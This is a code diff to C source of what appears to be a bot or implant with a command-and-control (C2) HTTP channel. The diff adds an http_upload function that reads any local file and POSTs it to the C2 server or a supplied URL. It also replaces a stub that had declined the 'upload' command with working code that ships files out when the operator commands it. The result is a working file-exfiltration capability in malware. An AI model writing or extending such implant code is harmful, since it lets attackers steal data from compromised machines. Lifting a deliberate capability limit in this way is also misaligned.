@@ -683,6 +683,136 @@ int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
     return body_len;
 }
 
+int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path) {
+    /* Read local file into memory */
+    FILE *f = fopen(file_path, "rb");
+    if (!f) {
+        log_error("http_upload: cannot open %s: %s", file_path, strerror(errno));
+        return -1;
+    }
+
+    fseek(f, 0, SEEK_END);
+    long file_size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    if (file_size <= 0 || file_size > PAYLOAD_MAX_SIZE) {
+        log_error("http_upload: invalid file size %ld", file_size);
+        fclose(f);
+        return -1;
+    }
+
+    char *file_data = (char *)malloc(file_size);
+    if (!file_data) {
+        log_error("http_upload: malloc failed for %ld bytes", file_size);
+        fclose(f);
+        return -1;
+    }
+
+    size_t nread = fread(file_data, 1, file_size, f);
+    fclose(f);
+
+    if ((long)nread != file_size) {
+        log_error("http_upload: short read (%zu of %ld)", nread, file_size);
+        free(file_data);
+        return -1;
+    }
+
+    /* Use configured C2 endpoint or specific URL */
+    char host[256];
+    uint16_t port;
+    char path[512];
+
+    if (upload_path && strncmp(upload_path, "http://", 7) == 0) {
+        char authority[256];
+        const char *p = upload_path + 7;
+        const char *slash = strchr(p, '/');
+        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
+        if (alen == 0 || alen >= sizeof(authority)) {
+            log_error("http_upload: malformed URL %s", upload_path);
+            free(file_data);
+            return -1;
+        }
+        memcpy(authority, p, alen);
+        authority[alen] = '\0';
+
+        snprintf(host, sizeof(host), "%s", authority);
+        port = 80;
+        char *colon = strrchr(host, ':');
+        if (colon) {
+            *colon = '\0';
+            port = (uint16_t)atoi(colon + 1);
+            if (port == 0) port = 80;
+        }
+        if (slash) snprintf(path, sizeof(path), "%s", slash);
+        else snprintf(path, sizeof(path), "/");
+    } else {
+        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
+        port = bot->c2_http.port;
+        snprintf(path, sizeof(path), "%s", upload_path ? upload_path : bot->c2_http.path);
+    }
+
+    /* Connect to server */
+    int sock = tcp_connect_sock(bot, host, port);
+    if (sock < 0) {
+        log_error("http_upload: connect to %s:%u failed", host, port);
+        free(file_data);
+        return -1;
+    }
+
+    /* Build POST request with Content-Length */
+    char headers[1024];
+    int hdr_len = snprintf(headers, sizeof(headers),
+        "POST %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "Content-Type: application/octet-stream\r\n"
+        "Content-Length: %ld\r\n"
+        "User-Agent: %s\r\n"
+        "Connection: close\r\n"
+        "\r\n",
+        path, host, file_size, bot->c2_http.user_agent);
+
+    if (send(sock, headers, hdr_len, 0) != hdr_len) {
+        log_warn("http_upload: headers send failed: %s", strerror(errno));
+        close(sock);
+        free(file_data);
+        return -1;
+    }
+
+    /* Send file body */
+    int sent = send(sock, file_data, file_size, 0);
+    free(file_data);
+
+    if (sent < 0 || sent < file_size) {
+        log_warn("http_upload: body send failed (sent %d of %ld): %s", sent, file_size, strerror(errno));
+        close(sock);
+        return -1;
+    }
+
+    /* Read response with timeout */
+    char buf[1024];
+    int total = 0;
+    while (total < (int)sizeof(buf) - 1) {
+        fd_set read_fds;
+        struct timeval tv;
+        FD_ZERO(&read_fds);
+        FD_SET(sock, &read_fds);
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+
+        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
+        if (sel <= 0) break;
+
+        int received = recv(sock, buf + total, (int)sizeof(buf) - total - 1, 0);
+        if (received <= 0) break;
+        total += received;
+    }
+    buf[total] = '\0';
+    close(sock);
+
+    log_info("http_upload: uploaded %ld bytes to %s, response: %.200s", file_size, path, buf);
+    return file_size;
+}
+
 void http_disconnect(notnet_bot_t *bot) {
     if (bot->c2_http.connected) {
         bot->c2_http.connected = 0;
@@ -1217,10 +1347,52 @@ int protocol_process_commands(notnet_bot_t *bot) {
         } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
             log_info("CMD: download");
         } else if (strncmp(cmd, CMD_UPLOAD, strlen(CMD_UPLOAD)) == 0) {
-            /* SECURITY: Log upload commands for audit trail. Actual file
-             * upload is not implemented — operator must use external tooling. */
-            log_warn("CMD: upload requested but not implemented");
-            protocol_send_response(bot, CMD_UPLOAD, "upload: not implemented on agent");
+            /* Parse: upload <local_path> [remote_path] */
+            char *args = cmd + strlen(CMD_UPLOAD);
+            while (*args == ' ' || *args == '\t') args++;
+
+            char local_path[512] = {0};
+            char remote_path[512] = {0};
+
+            /* Parse local path (first arg, up to space) */
+            char *space = strchr(args, ' ');
+            if (space) {
+                int len = space - args;
+                if (len > 511) len = 511;
+                memcpy(local_path, args, len);
+                local_path[len] = '\0';
+
+                /* Parse remote path (optional second arg) */
+                char *rem = space + 1;
+                while (*rem == ' ' || *rem == '\t') rem++;
+                if (*rem) {
+                    strncpy(remote_path, rem, 511);
+                    remote_path[511] = '\0';
+                }
+            } else {
+                /* No space — entire arg is local path, use default remote */
+                strncpy(local_path, args, 511);
+                local_path[511] = '\0';
+            }
+
+            /* Validate local path */
+            const char *bad = strpbrk(local_path, ";|&`$(){}[]<>!");
+            if (bad) {
+                log_warn("CMD: upload rejected (dangerous char in path: %s)", local_path);
+                protocol_send_response(bot, CMD_UPLOAD, "upload rejected: dangerous char in path");
+            } else if (local_path[0] == '\0') {
+                protocol_send_response(bot, CMD_UPLOAD, "upload: no file path specified, use 'upload <path> [remote_path]'");
+            } else {
+                int result = http_upload(bot, local_path, remote_path[0] ? remote_path : NULL);
+                if (result > 0) {
+                    char resp[256];
+                    snprintf(resp, sizeof(resp), "upload ok: %d bytes to %s", result,
+                             remote_path[0] ? remote_path : bot->c2_http.path);
+                    protocol_send_response(bot, CMD_UPLOAD, resp);
+                } else {
+                    protocol_send_response(bot, CMD_UPLOAD, "upload failed: could not upload file");
+                }
+            }
         } else if (strncmp(cmd, CMD_EXFIL, strlen(CMD_EXFIL)) == 0) {
             /* SECURITY: Log exfil attempts. Data exfiltration is not
              * implemented — operator must use external tooling. */
